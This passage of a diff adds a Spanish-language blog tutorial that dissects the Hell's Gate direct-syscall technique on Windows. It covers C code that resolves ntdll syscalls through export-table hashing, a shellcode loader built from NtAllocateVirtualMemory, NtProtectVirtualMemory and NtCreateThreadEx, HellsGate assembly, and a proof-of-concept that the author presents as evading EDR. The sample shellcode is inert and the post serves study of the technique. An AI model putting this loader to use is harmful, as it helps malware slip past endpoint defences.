+</span></span><span style="display:flex;"><span>        pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);
+</span></span><span style="display:flex;"><span>        pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* We found the target function */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">djb2</span>((PBYTE)pczFunctionName) <span style="color:#f92672">==</span> pVxTableEntry<span style="color:#f92672">-&gt;</span>dwHash) {
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            pVxTableEntry<span style="color:#f92672">-&gt;</span>pAddress <span style="color:#f92672">=</span> pFunctionAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Found target function: %s (0x%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pczFunctionName, pFunctionAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Syscall found @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (PVOID)((<span style="color:#66d9ef">intptr_t</span>)pFunctionAddress <span style="color:#f92672">+</span> cw));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                cw<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Nosotras podemos ver que la llamada del sistema fue encontrado.</p>
+<p><img src="/EzekielsWheelScreenshots/lookup_worked.png" alt="alt text"></p>
+<p>Vemos que si ubicamos la secuencia de bytes/instrucciones escribimos la lamada del sistema en la estructura <code>VX_TABLE</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                                        BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                                        BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                                        pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
+</span></span></code></pre></div><p>No estoy seguro de por qué debemos meter lo así, pero en WinDBG podemos ver que cuando leemos este valor es sencillo.</p>
+<p><img src="/EzekielsWheelScreenshots/syscall.png" alt="alt text"></p>
+<p>Ahora hemos implementado nuestra propia versión de esta función para comprender sus operaciones subyacentes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetVxTableEntry</span>(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PDWORD pdwAddressOfFunctions <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
+</span></span><span style="display:flex;"><span>    PDWORD pdwAddressOfNames <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNames);
+</span></span><span style="display:flex;"><span>    PWORD pwAddressOfNameOrdinales <span style="color:#f92672">=</span> (PWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    BYTE high <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    BYTE low <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    WORD cw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    PCHAR pczFunctionName <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PVOID pFunctionAddress <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);
+</span></span><span style="display:flex;"><span>        pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* We found the target function */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">djb2</span>((PBYTE)pczFunctionName) <span style="color:#f92672">==</span> pVxTableEntry<span style="color:#f92672">-&gt;</span>dwHash) {
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            pVxTableEntry<span style="color:#f92672">-&gt;</span>pAddress <span style="color:#f92672">=</span> pFunctionAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">/* Quick and dirty fix in case the function has been hooked */</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">/* Check if a syscall instruction has been reached, if so we are too deep into the function */</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0f</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x05</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">/* Check if a ret instruction has been reached, if so we read to deep into the function */</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc3</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                    low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] %s syscall start found @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pczFunctionName, (PVOID)((<span style="color:#66d9ef">intptr_t</span>)pFunctionAddress <span style="color:#f92672">+</span> cw));
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] High: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, high);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Low: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, low);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Syscall: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                cw<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Con eso podemos introducir el resto de la función <em>main()</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    vxTable.NtAllocateVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf5bd373480a6b89b</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pNtdllEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>vxTable.NtAllocateVirtualMemory))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x01</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    vxTable.NtCreateThreadEx.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x64dc7db288c5015f</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pNtdllEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>vxTable.NtCreateThreadEx))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    vxTable.NtProtectVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x858bcb1046fb6a37</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pNtdllEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>vxTable.NtProtectVirtualMemory))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    vxTable.NtWaitForSingleObject.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc6a2fa174e551bcb</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pNtdllEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>vxTable.NtWaitForSingleObject))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span></code></pre></div><h2 id="obteniendo-entendimiento-de-payload">Obteniendo Entendimiento de Payload()</h2>
+<p>Ahora estamos en la llamada final de la función <em>main()</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">Payload</span>(<span style="color:#f92672">&amp;</span>Table);
+</span></span></code></pre></div><p>Una vez más, esta funciones es implementa por el autor.
+Sin embargo, vemos tres funciones más interesantes: <code>HellsGate</code>, <code>HellsDescent</code>, and <code>VxMoveMemory</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Payload</span>(PVX_TABLE pVxTable) {
+</span></span><span style="display:flex;"><span>        NTSTATUS status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Allocate memory for the shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PVOID lpAddress <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>        SIZE_T sDataSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(shellcode);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">HellsGate</span>(pVxTable<span style="color:#f92672">-&gt;</span>NtAllocateVirtualMemory.wSystemCall);
+</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>((HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>lpAddress, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>sDataSize, MEM_COMMIT, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Write Memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">VxMoveMemory</span>(lpAddress, shellcode, <span style="color:#66d9ef">sizeof</span>(shellcode));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Change page permissions
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ULONG ulOldProtect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">HellsGate</span>(pVxTable<span style="color:#f92672">-&gt;</span>NtProtectVirtualMemory.wSystemCall);
+</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>((HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>lpAddress, <span style="color:#f92672">&amp;</span>sDataSize, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>ulOldProtect);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Create thread
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        HANDLE hHostThread <span style="color:#f92672">=</span> INVALID_HANDLE_VALUE;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">HellsGate</span>(pVxTable<span style="color:#f92672">-&gt;</span>NtCreateThreadEx.wSystemCall);
+</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(<span style="color:#f92672">&amp;</span>hHostThread, <span style="color:#ae81ff">0x1FFFFF</span>, NULL, (HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Wait for 1 seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        LARGE_INTEGER Timeout;
+</span></span><span style="display:flex;"><span>        Timeout.QuadPart <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10000000</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">HellsGate</span>(pVxTable<span style="color:#f92672">-&gt;</span>NtWaitForSingleObject.wSystemCall);
+</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(hHostThread, FALSE, <span style="color:#f92672">&amp;</span>Timeout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="obteniendo-entendimiento-de-hellsgate">Obteniendo Entendimiento de HellsGate</h2>
+<p>Podemos seguir adelante e ignorar la operación de <code>VxMoveMemory</code> - esto es solo una implementación personalizada de <em>memcpy()</em> creado por el autor. Sin embargo, podemos empezar a comprender las operaciones de la primera llamada - HellsGate.</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">.data
+        wSystemCall DWORD 000h
+
+.code
+        HellsGate PROC
+                mov wSystemCall, 000h
+                mov wSystemCall, ecx
+                ret
+        HellsGate ENDP
+</code></pre><p>Coloquemos una <code>DebugBreak();</code> antes de esta llamada.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#a6e22e">DebugBreak</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HellsGate</span>(pVxTable<span style="color:#f92672">-&gt;</span>NtAllocateVirtualMemory.wSystemCall);
+</span></span></code></pre></div><p>Una vez corriendo en WinDBG, podemos ver que estamos a punto de ingresar a la llamada a HellsGate.</p>
+<p><img src="/EzekielsWheelScreenshots/about_to_call_hg.png" alt="alt text"></p>
+<p>Una vez que estemos a dentro, podremos ver que ejecutaremos las llamadas al sistema que resolvimos dinámicamente.</p>
+<p><img src="/EzekielsWheelScreenshots/using_hg.png" alt="alt text"></p>
+<h2 id="obteniendo-entendimiento-de-hellsdescent">Obteniendo Entendimiento de HellsDescent</h2>
+<p>At this point our assembler holds the number call of the system para <code>NtAllocateVirtualMemory</code> dentro de la sección <code>.data</code> del binario. El siguiente paso es llamar HellsDescent, aquí es donde ejecutamos la llamada del sistema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>((HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>lpAddress, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>sDataSize, MEM_COMMIT, PAGE_READWRITE);
+</span></span></code></pre></div><p>Cuando lleguemos a HellsDescent podemos ver que estamos moviendo RCX a R10. Normalmente, al emitir una llamada a una función, los argumentos se envían en el orden <code>RCX, RDX, R8, R9 cualquier argumento adicional se coloca en el stack a una distancia de 0x20</code>. Si miramos el prototipo de la función <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateMemory()</a> rápidamente vemos que todos estos argumentos simplemente no se pueden almacenar dentro de RCX a menos que RCX sea un puntero a un objeto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>__kernel_entry NTSYSCALLAPI NTSTATUS <span style="color:#a6e22e">NtAllocateVirtualMemory</span>(
+</span></span><span style="display:flex;"><span>  [in]      HANDLE    ProcessHandle,
+</span></span><span style="display:flex;"><span>  [in, out] PVOID     <span style="color:#f92672">*</span>BaseAddress,
+</span></span><span style="display:flex;"><span>  [in]      ULONG_PTR ZeroBits,
+</span></span><span style="display:flex;"><span>  [in, out] PSIZE_T   RegionSize,
+</span></span><span style="display:flex;"><span>  [in]      ULONG     AllocationType,
+</span></span><span style="display:flex;"><span>  [in]      ULONG     Protect
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Esto se confirma además al deshacerse de los estados de registro.</p>
+<p><img src="/EzekielsWheelScreenshots/breakdown_hd.png" alt="alt text"></p>
+<p>En este punto tenemos un conocimiento sólido de cómo HellsGate opera :)</p>
+<ol>
+<li>Lea el InMemoryOrderModuleList y obtener la dirección base de NTDLL</li>
+<li>Obtener la dirección del EAT for NTDLL</li>
+<li>Lea la EAT buscando llamadas del sistema</li>
+<li>Ejecutar llamadas del sistema.</li>
+<li>Ganancia</li>
+</ol>
+<h1 id="poc--valm---tronos-de-ezequiel">PoC | VALM - (Tronos de Ezequiel)</h1>
+<p>Hemos aprendido el funcionamiento interno de la Puerta del Infierno, es importante saber que esto no habría sido posible sin el conocimiento fundamental de la llamada al sistema.</p>
+<p><img src="/EzekielsWheelScreenshots/poc.gif" alt="alt text"></p>
+<p>Los cambios que he implementado son los siguientes</p>
+<ol>
+<li>Las llamadas al sistema se generan dinámicamente.</li>
+<li>Reutilización de código, vivimos de la tierra y aprovechamos ntdll.dll para realizar llamadas al sistema por nosotros. Esto hace que las operaciones parezcan normales evadiendo EDR.</li>
+<li>Hemos vuelto a implementar nuestra propia técnica de hash para el descubrimiento de rutinas de funciones.</li>
+<li>Le dimos un nombre que es fuerte.</li>
+</ol>
+<p><strong>Ezequiel 10:10</strong>: En cuanto a su apariencia, las cuatro tenían la misma semejanza, como si una rueda estuviera dentro de la otra rueda.</p>
+<h1 id="recursos">Recursos</h1>
+<pre tabindex="0"><code>http://malwareid.in/unpack/unpacking-basics/export-address-table-and-dll-hijacking
+https://doxygen.reactos.org/de/d20/struct__IMAGE__EXPORT__DIRECTORY.html
+https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record
+https://davidesnotes.com/articles/1/?page=1#
+https://gist.github.com/Spl3en/9c0ea329bb7878df9b9b
+https://redops.at/en/blog/exploring-hells-gate
+http://www.rohitab.com/discuss/topic/42191-c-peb-ldr-inmemoryordermodulelist-flink-dllbase-dont-get-the-good-address/
+https://www.vergiliusproject.com/
+https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/
+https://www.youtube.com/watch?v=elA_eiqWefw&amp;t=2s
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
